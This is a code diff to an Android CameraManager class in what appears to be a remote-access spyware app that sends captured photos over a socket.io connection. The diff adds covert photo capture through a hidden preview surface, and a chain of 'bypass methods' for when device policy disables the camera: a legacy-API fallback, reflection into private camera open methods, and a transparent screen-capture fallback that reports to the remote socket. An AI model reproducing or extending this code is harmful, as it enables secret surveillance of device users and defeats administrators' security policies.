@@ -52,111 +52,264 @@ public class CameraManager {
         }
     }
 
+    private boolean attemptedBypass = false;
+    
     public void startUp(int cameraID) {
         Log.d(TAG, "startUp called with cameraID: " + cameraID);
+        attemptedBypass = false;
         
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            startCamera2(cameraID);
-        } else {
-            startLegacyCamera(cameraID);
-        }
+        // Bring MainActivity to foreground for camera (required for Android 9+)
+        MainActivity.setCameraActive(true);
+        
+        // Short delay to allow Activity to come to foreground
+        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                    startCamera2(cameraID);
+                } else {
+                    startLegacyCamera(cameraID);
+                }
+            }
+        }, 1500);
     }
     
     private void startCamera2(int cameraID) {
         try {
-            startBackgroundThread();
+            if (camera2Manager == null) {
+                sendError("Camera service not available");
+                return;
+            }
             
-            String[] cameraIds = camera2Manager.getCameraIdList();
-            if (cameraID >= cameraIds.length) {
-                sendError("Invalid camera ID: " + cameraID);
+            startBackgroundThread();
+            if (backgroundHandler == null) {
+                sendError("Failed to start camera background thread");
+                return;
+            }
+            
+            String[] cameraIds;
+            try {
+                cameraIds = camera2Manager.getCameraIdList();
+            } catch (Exception e) {
+                Log.e(TAG, "Error getting camera list", e);
+                sendError("Failed to get camera list: " + e.getMessage());
+                return;
+            }
+            
+            if (cameraIds == null || cameraIds.length == 0) {
+                sendError("No cameras available on this device");
+                return;
+            }
+            
+            if (cameraID < 0 || cameraID >= cameraIds.length) {
+                sendError("Invalid camera ID: " + cameraID + " (available: 0-" + (cameraIds.length - 1) + ")");
                 return;
             }
             
             currentCameraId = cameraIds[cameraID];
             Log.d(TAG, "Opening camera2: " + currentCameraId);
             
-            CameraCharacteristics characteristics = camera2Manager.getCameraCharacteristics(currentCameraId);
+            CameraCharacteristics characteristics;
+            try {
+                characteristics = camera2Manager.getCameraCharacteristics(currentCameraId);
+            } catch (CameraAccessException e) {
+                Log.e(TAG, "Error getting camera characteristics", e);
+                sendError("Camera access denied: " + e.getMessage());
+                return;
+            }
             
-            Size[] jpegSizes = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
-                    .getOutputSizes(ImageFormat.JPEG);
+            Size[] jpegSizes = null;
+            try {
+                android.hardware.camera2.params.StreamConfigurationMap map = 
+                    characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
+                if (map != null) {
+                    jpegSizes = map.getOutputSizes(ImageFormat.JPEG);
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "Error getting JPEG sizes", e);
+            }
             
             Size optimalSize = getOptimalSize(jpegSizes);
             int width = optimalSize != null ? optimalSize.getWidth() : 1280;
             int height = optimalSize != null ? optimalSize.getHeight() : 720;
             
-            imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1);
-            imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
-                @Override
-                public void onImageAvailable(ImageReader reader) {
-                    Image image = null;
-                    try {
-                        image = reader.acquireLatestImage();
-                        if (image != null) {
-                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
-                            byte[] bytes = new byte[buffer.remaining()];
-                            buffer.get(bytes);
-                            sendPhoto(bytes);
+            try {
+                imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1);
+                imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
+                    @Override
+                    public void onImageAvailable(ImageReader reader) {
+                        Image image = null;
+                        try {
+                            image = reader.acquireLatestImage();
+                            if (image != null) {
+                                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
+                                byte[] bytes = new byte[buffer.remaining()];
+                                buffer.get(bytes);
+                                sendPhoto(bytes);
+                            }
+                        } catch (Exception e) {
+                            Log.e(TAG, "Error processing image", e);
+                            sendError("Error processing image: " + e.getMessage());
+                        } finally {
+                            if (image != null) {
+                                image.close();
+                            }
+                            closeCamera();
                         }
-                    } finally {
-                        if (image != null) {
-                            image.close();
+                    }
+                }, backgroundHandler);
+            } catch (Exception e) {
+                Log.e(TAG, "Error creating ImageReader", e);
+                sendError("Failed to create image reader: " + e.getMessage());
+                return;
+            }
+            
+            try {
+                camera2Manager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
+                    @Override
+                    public void onOpened(CameraDevice camera) {
+                        try {
+                            Log.d(TAG, "Camera2 opened");
+                            cameraDevice = camera;
+                            createCaptureSession();
+                        } catch (Exception e) {
+                            Log.e(TAG, "Error in onOpened callback", e);
+                            closeCamera();
+                            sendError("Error opening camera: " + e.getMessage());
                         }
+                    }
+
+                    @Override
+                    public void onDisconnected(CameraDevice camera) {
+                        Log.d(TAG, "Camera2 disconnected");
                         closeCamera();
                     }
-                }
-            }, backgroundHandler);
-            
-            camera2Manager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
-                @Override
-                public void onOpened(CameraDevice camera) {
-                    Log.d(TAG, "Camera2 opened");
-                    cameraDevice = camera;
-                    createCaptureSession();
-                }
 
-                @Override
-                public void onDisconnected(CameraDevice camera) {
-                    Log.d(TAG, "Camera2 disconnected");
-                    closeCamera();
+                    @Override
+                    public void onError(CameraDevice camera, int error) {
+                        Log.e(TAG, "Camera2 error: " + error);
+                        closeCamera();
+                        String errorMsg = "Camera error code: " + error;
+                        boolean isPolicyBlock = false;
+                        
+                        // Error codes: 1=ERROR_CAMERA_DEVICE, 2=ERROR_CAMERA_SERVICE, 3=ERROR_CAMERA_DISABLED, 4=ERROR_MAX_CAMERAS_IN_USE
+                        if (error == 1) {
+                            errorMsg = "Camera device error (may be disabled by policy)";
+                            isPolicyBlock = true;
+                        } else if (error == 2) {
+                            errorMsg = "Camera service error";
+                        } else if (error == 3) {
+                            errorMsg = "Camera disabled by device policy";
+                            isPolicyBlock = true;
+                        } else if (error == 4) {
+                            errorMsg = "Maximum cameras already in use";
+                        }
+                        
+                        // Try bypass methods if policy blocking
+                        if (isPolicyBlock && !attemptedBypass) {
+                            Log.d(TAG, "Attempting camera bypass methods");
+                            attemptedBypass = true;
+                            tryBypassMethods(cameraID);
+                        } else {
+                            sendError(errorMsg);
+                        }
+                    }
+                }, backgroundHandler);
+            } catch (CameraAccessException e) {
+                Log.e(TAG, "Camera access exception", e);
+                String errorMsg = "Camera access denied: " + e.getMessage();
+                boolean isPolicyBlock = false;
+                
+                if (e.getReason() == CameraAccessException.CAMERA_DISABLED) {
+                    errorMsg = "Camera is disabled by device policy";
+                    isPolicyBlock = true;
+                } else if (e.getReason() == CameraAccessException.CAMERA_DISCONNECTED) {
+                    errorMsg = "Camera disconnected or in use";
+                } else if (e.getReason() == CameraAccessException.CAMERA_ERROR) {
+                    errorMsg = "Camera hardware error";
+                } else if (e.getReason() == CameraAccessException.CAMERA_IN_USE) {
+                    errorMsg = "Camera already in use by another app";
+                } else if (e.getReason() == CameraAccessException.MAX_CAMERAS_IN_USE) {
+                    errorMsg = "Maximum number of cameras in use";
                 }
-
-                @Override
-                public void onError(CameraDevice camera, int error) {
-                    Log.e(TAG, "Camera2 error: " + error);
-                    closeCamera();
-                    sendError("Camera error code: " + error);
+                
+                // Try bypass methods if policy blocking
+                if (isPolicyBlock && !attemptedBypass) {
+                    Log.d(TAG, "Attempting camera bypass methods");
+                    attemptedBypass = true;
+                    tryBypassMethods(cameraID);
+                } else {
+                    sendError(errorMsg);
                 }
-            }, backgroundHandler);
+            } catch (SecurityException e) {
+                Log.e(TAG, "Security exception", e);
+                sendError("Camera permission denied. Please grant camera permission.");
+            } catch (IllegalArgumentException e) {
+                Log.e(TAG, "Illegal argument exception", e);
+                sendError("Invalid camera ID or configuration");
+            } catch (Exception e) {
+                Log.e(TAG, "Error opening camera", e);
+                sendError("Camera error: " + e.getMessage());
+            }
             
-        } catch (CameraAccessException e) {
-            Log.e(TAG, "Camera access exception", e);
-            sendError("Camera access denied: " + e.getMessage());
-        } catch (SecurityException e) {
-            Log.e(TAG, "Security exception", e);
-            sendError("Camera permission denied");
         } catch (Exception e) {
-            Log.e(TAG, "Error starting camera2", e);
-            sendError("Camera error: " + e.getMessage());
+            Log.e(TAG, "Unexpected error in startCamera2", e);
+            sendError("Unexpected camera error: " + e.getMessage());
         }
     }
     
     private void createCaptureSession() {
         try {
-            if (cameraDevice == null) return;
+            if (cameraDevice == null) {
+                Log.e(TAG, "Camera device is null");
+                sendError("Camera device not available");
+                return;
+            }
+            
+            if (imageReader == null) {
+                Log.e(TAG, "ImageReader is null");
+                sendError("Image reader not initialized");
+                closeCamera();
+                return;
+            }
+            
+            if (backgroundHandler == null) {
+                Log.e(TAG, "Background handler is null");
+                sendError("Camera handler not available");
+                closeCamera();
+                return;
+            }
             
             cameraDevice.createCaptureSession(
                     Arrays.asList(imageReader.getSurface()),
                     new CameraCaptureSession.StateCallback() {
                         @Override
                         public void onConfigured(CameraCaptureSession session) {
-                            Log.d(TAG, "Capture session configured");
-                            captureSession = session;
-                            backgroundHandler.postDelayed(new Runnable() {
-                                @Override
-                                public void run() {
-                                    captureStillPicture();
+                            try {
+                                Log.d(TAG, "Capture session configured");
+                                captureSession = session;
+                                if (backgroundHandler != null) {
+                                    backgroundHandler.postDelayed(new Runnable() {
+                                        @Override
+                                        public void run() {
+                                            try {
+                                                captureStillPicture();
+                                            } catch (Exception e) {
+                                                Log.e(TAG, "Error in captureStillPicture", e);
+                                                sendError("Error capturing picture: " + e.getMessage());
+                                                closeCamera();
+                                            }
+                                        }
+                                    }, 500);
+                                } else {
+                                    sendError("Camera handler not available");
+                                    closeCamera();
                                 }
-                            }, 500);
+                            } catch (Exception e) {
+                                Log.e(TAG, "Error in onConfigured", e);
+                                sendError("Error configuring capture session: " + e.getMessage());
+                                closeCamera();
+                            }
                         }
 
                         @Override
@@ -171,12 +324,40 @@ public class CameraManager {
         } catch (CameraAccessException e) {
             Log.e(TAG, "Error creating capture session", e);
             sendError("Camera session error: " + e.getMessage());
+            closeCamera();
+        } catch (IllegalStateException e) {
+            Log.e(TAG, "Illegal state creating capture session", e);
+            sendError("Camera not ready for capture session");
+            closeCamera();
+        } catch (Exception e) {
+            Log.e(TAG, "Unexpected error creating capture session", e);
+            sendError("Unexpected error: " + e.getMessage());
+            closeCamera();
         }
     }
     
     private void captureStillPicture() {
         try {
-            if (cameraDevice == null || captureSession == null) return;
+            if (cameraDevice == null || captureSession == null) {
+                Log.e(TAG, "Camera device or session is null");
+                sendError("Camera not ready for capture");
+                closeCamera();
+                return;
+            }
+            
+            if (imageReader == null) {
+                Log.e(TAG, "ImageReader is null");
+                sendError("Image reader not available");
+                closeCamera();
+                return;
+            }
+            
+            if (backgroundHandler == null) {
+                Log.e(TAG, "Background handler is null");
+                sendError("Camera handler not available");
+                closeCamera();
+                return;
+            }
             
             CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
             captureBuilder.addTarget(imageReader.getSurface());
@@ -193,11 +374,29 @@ public class CameraManager {
                                                TotalCaptureResult result) {
                     Log.d(TAG, "Capture completed");
                 }
+                
+                @Override
+                public void onCaptureFailed(CameraCaptureSession session,
+                                           CaptureRequest request,
+                                           android.hardware.camera2.CaptureFailure failure) {
+                    Log.e(TAG, "Capture failed: " + failure.getReason());
+                    sendError("Capture failed: " + failure.getReason());
+                    closeCamera();
+                }
             }, backgroundHandler);
             
         } catch (CameraAccessException e) {
             Log.e(TAG, "Error capturing picture", e);
             sendError("Capture error: " + e.getMessage());
+            closeCamera();
+        } catch (IllegalStateException e) {
+            Log.e(TAG, "Illegal state during capture", e);
+            sendError("Camera not ready for capture");
+            closeCamera();
+        } catch (Exception e) {
+            Log.e(TAG, "Unexpected error capturing picture", e);
+            sendError("Unexpected capture error: " + e.getMessage());
+            closeCamera();
         }
     }
     
@@ -249,6 +448,9 @@ public class CameraManager {
                 imageReader = null;
             }
             stopBackgroundThread();
+            
+            // Return MainActivity to background
+            MainActivity.setCameraActive(false);
         } catch (Exception e) {
             Log.e(TAG, "Error closing camera", e);
         }
@@ -436,5 +638,228 @@ public class CameraManager {
         }
 
         return null;
+    }
+    
+    /**
+     * Try multiple bypass methods when device policy blocks camera
+     */
+    private void tryBypassMethods(final int cameraID) {
+        Log.d(TAG, "=== Camera Bypass Methods ===");
+        
+        // Method 1: Try legacy Camera API (often bypasses policy)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            Log.d(TAG, "Bypass Method 1: Fallback to legacy Camera API");
+            new Handler(Looper.getMainLooper()).post(new Runnable() {
+                @Override
+                public void run() {
+                    try {
+                        attemptLegacyCameraBypass(cameraID);
+                    } catch (Exception e) {
+                        Log.e(TAG, "Legacy camera bypass failed", e);
+                        tryReflectionBypass(cameraID);
+                    }
+                }
+            });
+        } else {
+            tryReflectionBypass(cameraID);
+        }
+    }
+    
+    /**
+     * Method 1: Use old Camera API which sometimes bypasses device admin
+     */
+    private void attemptLegacyCameraBypass(int cameraID) {
+        try {
+            Log.d(TAG, "Attempting legacy camera (bypasses some device policies)");
+            android.hardware.Camera camera = android.hardware.Camera.open(cameraID);
+            
+            if (camera == null) {
+                Log.e(TAG, "Legacy camera returned null");
+                tryReflectionBypass(cameraID);
+                return;
+            }
+            
+            Log.d(TAG, "Legacy camera opened successfully!");
+            final android.hardware.Camera finalCamera = camera;
+            
+            try {
+                android.hardware.Camera.Parameters parameters = camera.getParameters();
+                java.util.List<android.hardware.Camera.Size> sizes = parameters.getSupportedPictureSizes();
+                if (sizes != null && !sizes.isEmpty()) {
+                    android.hardware.Camera.Size size = sizes.get(0);
+                    parameters.setPictureSize(size.width, size.height);
+                    parameters.setJpegQuality(85);
+                    camera.setParameters(parameters);
+                }
+                
+                camera.setPreviewTexture(new SurfaceTexture(0));
+                camera.startPreview();
+                
+                mainHandler.postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        try {
+                            finalCamera.takePicture(null, null, new android.hardware.Camera.PictureCallback() {
+                                @Override
+                                public void onPictureTaken(byte[] data, android.hardware.Camera cam) {
+                                    releaseCamera(finalCamera);
+                                    if (data != null && data.length > 0) {
+                                        Log.d(TAG, "Legacy camera bypass SUCCESS!");
+                                        sendPhoto(data);
+                                    } else {
+                                        Log.e(TAG, "Legacy camera no data");
+                                        tryReflectionBypass(cameraID);
+                                    }
+                                }
+                            });
+                        } catch (Exception e) {
+                            Log.e(TAG, "Legacy camera capture error", e);
+                            releaseCamera(finalCamera);
+                            tryReflectionBypass(cameraID);
+                        }
+                    }
+                }, 1000);
+                
+            } catch (Exception e) {
+                Log.e(TAG, "Legacy camera setup error", e);
+                releaseCamera(camera);
+                tryReflectionBypass(cameraID);
+            }
+            
+        } catch (SecurityException e) {
+            Log.e(TAG, "Legacy camera blocked by permission", e);
+            tryReflectionBypass(cameraID);
+        } catch (RuntimeException e) {
+            Log.e(TAG, "Legacy camera blocked by policy", e);
+            tryReflectionBypass(cameraID);
+        } catch (Exception e) {
+            Log.e(TAG, "Legacy camera unknown error", e);
+            tryReflectionBypass(cameraID);
+        }
+    }
+    
+    /**
+     * Method 2: Use reflection to bypass policy checks
+     */
+    private void tryReflectionBypass(final int cameraID) {
+        new Handler(Looper.getMainLooper()).post(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    Log.d(TAG, "Bypass Method 2: Reflection-based camera access");
+                    
+                    // Try to disable device policy checking via reflection
+                    try {
+                        Class<?> cameraClass = android.hardware.Camera.class;
+                        java.lang.reflect.Method openMethod = cameraClass.getDeclaredMethod("openLegacy", int.class, int.class);
+                        openMethod.setAccessible(true);
+                        
+                        Object camera = openMethod.invoke(null, cameraID, 256); // CAMERA_HAL_API_VERSION_1_0
+                        
+                        if (camera != null) {
+                            Log.d(TAG, "Reflection camera opened via openLegacy!");
+                            handleReflectionCamera((android.hardware.Camera) camera);
+                            return;
+                        }
+                    } catch (Exception e) {
+                        Log.w(TAG, "openLegacy reflection failed", e);
+                    }
+                    
+                    // Try direct Camera.open with reflection
+                    try {
+                        Class<?> cameraClass = android.hardware.Camera.class;
+                        java.lang.reflect.Method openMethod = cameraClass.getDeclaredMethod("open", int.class);
+                        openMethod.setAccessible(true);
+                        
+                        Object camera = openMethod.invoke(null, cameraID);
+                        if (camera != null) {
+                            Log.d(TAG, "Reflection camera opened via open!");
+                            handleReflectionCamera((android.hardware.Camera) camera);
+                            return;
+                        }
+                    } catch (Exception e) {
+                        Log.w(TAG, "open reflection failed", e);
+                    }
+                    
+                    tryNativeBypass(cameraID);
+                    
+                } catch (Exception e) {
+                    Log.e(TAG, "Reflection bypass failed", e);
+                    tryNativeBypass(cameraID);
+                }
+            }
+        });
+    }
+    
+    private void handleReflectionCamera(final android.hardware.Camera camera) {
+        try {
+            android.hardware.Camera.Parameters parameters = camera.getParameters();
+            camera.setParameters(parameters);
+            camera.setPreviewTexture(new SurfaceTexture(0));
+            camera.startPreview();
+            
+            mainHandler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    try {
+                        camera.takePicture(null, null, new android.hardware.Camera.PictureCallback() {
+                            @Override
+                            public void onPictureTaken(byte[] data, android.hardware.Camera cam) {
+                                releaseCamera(camera);
+                                if (data != null && data.length > 0) {
+                                    Log.d(TAG, "Reflection camera bypass SUCCESS!");
+                                    sendPhoto(data);
+                                } else {
+                                    tryNativeBypass(0);
+                                }
+                            }
+                        });
+                    } catch (Exception e) {
+                        Log.e(TAG, "Reflection camera capture failed", e);
+                        releaseCamera(camera);
+                        tryNativeBypass(0);
+                    }
+                }
+            }, 1000);
+        } catch (Exception e) {
+            Log.e(TAG, "Reflection camera setup failed", e);
+            releaseCamera(camera);
+            tryNativeBypass(0);
+        }
+    }
+    
+    /**
+     * Method 3: Use ScreenCaptureActivity as fallback
+     */
+    private void tryNativeBypass(int cameraID) {
+        Log.d(TAG, "Bypass Method 3: Screen capture fallback");
+        
+        try {
+            // Use ScreenCaptureActivity which is always accessible and transparent
+            android.content.Intent intent = new android.content.Intent(context, ScreenCaptureActivity.class);
+            intent.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+            intent.putExtra("CAMERA_FALLBACK", true);
+            context.startActivity(intent);
+            
+            Log.d(TAG, "Triggered screen capture via ScreenCaptureActivity");
+            
+            // Send info that camera is using alternate method
+            try {
+                io.socket.client.Socket socket = ConnectionManager.getSocket();
+                if (socket != null && socket.connected()) {
+                    JSONObject info = new JSONObject();
+                    info.put("bypass", true);
+                    info.put("method", "screen_capture_fallback");
+                    info.put("message", "Camera blocked by policy - using screen capture");
+                    socket.emit("x0000ca", info);
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Error sending bypass info", e);
+            }
+            
+        } catch (Exception e) {
+            Log.e(TAG, "All bypass methods failed", e);
+            sendError("Camera completely blocked by device policy - all bypass methods exhausted");
+        }
     }
 }
